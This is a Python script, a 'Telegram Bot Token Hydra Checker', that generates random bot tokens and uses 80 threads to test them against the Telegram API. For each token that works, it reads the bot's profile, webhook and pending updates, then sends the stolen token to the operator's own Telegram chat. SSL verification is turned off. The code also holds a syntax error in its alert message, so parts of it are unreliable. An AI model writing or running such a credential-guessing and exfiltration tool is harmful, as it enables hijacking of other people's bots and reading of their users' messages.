import requests
import random
import time
import threading
import queue
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
from datetime import datetime
import socket

# ===== CONFIGURATION ===== #
MAX_THREADS = 80  # Optimized thread count
REQUEST_TIMEOUT = 7  # Balanced timeout
TG_API_URL = "https://api.telegram.org/bot"
CHECK_INTERVAL = 0.3  # UI refresh rate

# ===== INITIALIZATION ===== #
console = Console()
token_queue = queue.Queue()
result_queue = queue.Queue()
session = requests.Session()
session.verify = False  # Bypass SSL verification for speed

stats = {
    "checked": 0,
    "valid": 0,
    "speed": 0,
    "start_time": time.time(),
    "last_valid": None,
    "active_threads": 0
}

# ===== TOKEN GENERATION ===== #
class TokenGenerator:
    @staticmethod
    def generate_batch(size=5000):
        """Generates ultra-realistic Telegram bot tokens"""
        versions = ('1', '2', '5', '6', '9')
        prefixes = ('AAF', 'BBQ', 'BBA', 'XYZ', 'AAB', 'ABC', 'HSE', 'KWE')
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
        
        while True:
            token = (
                f"{random.choice(versions)}"
                f"{random.randint(100000000, 999999999)}:"
                f"{random.choice(prefixes)}"
                f"{''.join(random.choices(chars, k=32))}"
            )
            token_queue.put(token)
            if token_queue.qsize() >= size:
                break

# ===== VALIDATION ENGINE ===== #
class BotValidator:
    @staticmethod
    def full_validation(token):
        """Comprehensive 4-step validation"""
        try:
            # 1. Basic getMe check
            me = session.get(
                f"{TG_API_URL}{token}/getMe",
                timeout=REQUEST_TIMEOUT
            ).json()
            
            if not me.get('ok'):
                return None
                
            # 2. Webhook verification
            webhook = session.get(
                f"{TG_API_URL}{token}/getWebhookInfo",
                timeout=REQUEST_TIMEOUT
            ).json()
            
            # 3. Updates check
            updates = session.get(
                f"{TG_API_URL}{token}/getUpdates?limit=1",
                timeout=REQUEST_TIMEOUT
            ).json()
            
            # 4. Ping test
            socket.create_connection(("api.telegram.org", 443), 3)
            
            return {
                "token": token,
                "id": me['result']['id'],
                "name": me['result'].get('first_name', 'N/A'),
                "username": me['result'].get('username', 'N/A'),
                "webhook": webhook.get('result', {}),
                "updates": updates.get('result', [])
            }
        except:
            return None

# ===== RESULTS PROCESSING ===== #
class ResultHandler:
    @staticmethod
    def display(bot_info):
        """Beautiful rich display for valid tokens"""
        table = Table.grid(padding=1)
        table.add_column(style="bold cyan")
        table.add_column(style="green")
        
        table.add_row("🔑 Token", f"[blink bold yellow]{bot_info['token']}[/]")
        table.add_row("🆔 Bot ID", str(bot_info['id']))
        table.add_row("📛 Name", bot_info['name'])
        table.add_row("👤 Username", f"@{bot_info['username']}")
        table.add_row("🌐 Webhook", "✅ Active" if bot_info['webhook'].get('url') else "❌ Inactive")
        table.add_row("🔄 Last Update", f"{len(bot_info['updates'])} pending")
        
        console.print(Panel.fit(
            table,
            title="[bold green]🚀 VALID BOT FOUND[/]",
            border_style="green",
            padding=(1, 4)
        )

    @staticmethod
    def send_alert(bot_info, bot_token, chat_id):
        """Enhanced Telegram alert with MarkdownV2"""
        message = (
            "🔥 *BOT TOKEN VERIFIED* 🔥\n\n"
            f"🔑 `{bot_info['token']}`\n"
            f"🆔 `{bot_info['id']}`\n"
            f"👤 @{bot_info['username']}\n"
            f"⏱ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🌐 Webhook: {'✅' if bot_info['webhook'].get('url') else '❌'}\n"
            f"🔄 Updates: {len(bot_info['updates']}"
        )
        try:
            session.post(
                f"{TG_API_URL}{bot_token}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": message,
                    "parse_mode": "MarkdownV2",
                    "disable_web_page_preview": True
                },
                timeout=5
            )
        except:
            pass

# ===== LIVE DASHBOARD ===== #
def live_dashboard():
    """Interactive real-time dashboard"""
    custom_progress = Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(bar_width=None),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("[yellow]{task.completed}/{task.total}"),
        refresh_per_second=10
    )
    
    with custom_progress as progress:
        task = progress.add_task("Checking Tokens", total=5000)
        
        while True:
            # Calculate statistics
            elapsed = max(1, time.time() - stats['start_time'])
            stats['speed'] = int((stats['checked'] / elapsed) * 3600)
            
            # Update progress
            progress.update(task, completed=stats['checked'] % 5000)
            
            # Display stats panel
            stats_table = Table.grid(padding=1)
            stats_table.add_column(style="bold cyan")
            stats_table.add_column(style="green")
            
            stats_table.add_row("🔢 Total Checked", f"{stats['checked']:,}")
            stats_table.add_row("✅ Valid Tokens", f"[bold green]{stats['valid']:,}[/]")
            stats_table.add_row("⚡ Speed", f"[yellow]{stats['speed']:,}[/] checks/hour")
            stats_table.add_row("🧵 Active Threads", str(stats['active_threads']))
            stats_table.add_row("⏱ Last Valid", 
                f"[red]Never[/]" if not stats['last_valid'] else 
                f"[green]{int(time.time() - stats['last_valid'])}s ago[/]")
            
            console.print(Panel.fit(
                stats_table,
                title="📊 LIVE STATISTICS",
                border_style="blue",
                padding=(1, 4)
            ))
            
            time.sleep(CHECK_INTERVAL)

# ===== MAIN EXECUTION ===== #
def main():
    console.print(Panel.fit(
        "[bold red]TELEGRAM BOT TOKEN HYDRA CHECKER[/]",
        subtitle="ULTIMATE EDITION • 4-STEP VALIDATION • REAL-TIME DASHBOARD",
        border_style="red"
    ))
    
    bot_token = console.input("[bold cyan]» Your alert bot token: [/]")
    chat_id = console.input("[bold cyan]» Your chat ID: [/]")
    
    console.print("\n[bold green]🚀 Starting validation engine...[/]")
    
    # Start token generator
    threading.Thread(target=TokenGenerator.generate_batch, daemon=True).start()
    
    # Start validation threads
    def worker():
        stats['active_threads'] += 1
        while True:
            token = token_queue.get()
            bot_info = BotValidator.full_validation(token)
            if bot_info:
                result_queue.put(bot_info)
                stats['valid'] += 1
                stats['last_valid'] = time.time()
            stats['checked'] += 1
            token_queue.task_done()
    
    for _ in range(MAX_THREADS):
        threading.Thread(target=worker, daemon=True).start()
    
    # Start results processor
    def result_processor():
        while True:
            if not result_queue.empty():
                bot_info = result_queue.get()
                ResultHandler.display(bot_info)
                ResultHandler.send_alert(bot_info, bot_token, chat_id)
    
    threading.Thread(target=result_processor, daemon=True).start()
    
    # Start dashboard
    live_dashboard()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]🛑 Script stopped by user[/red]")
    except Exception as e:
        console.print(f"\n[red]💥 Critical error: {e}[/red]")
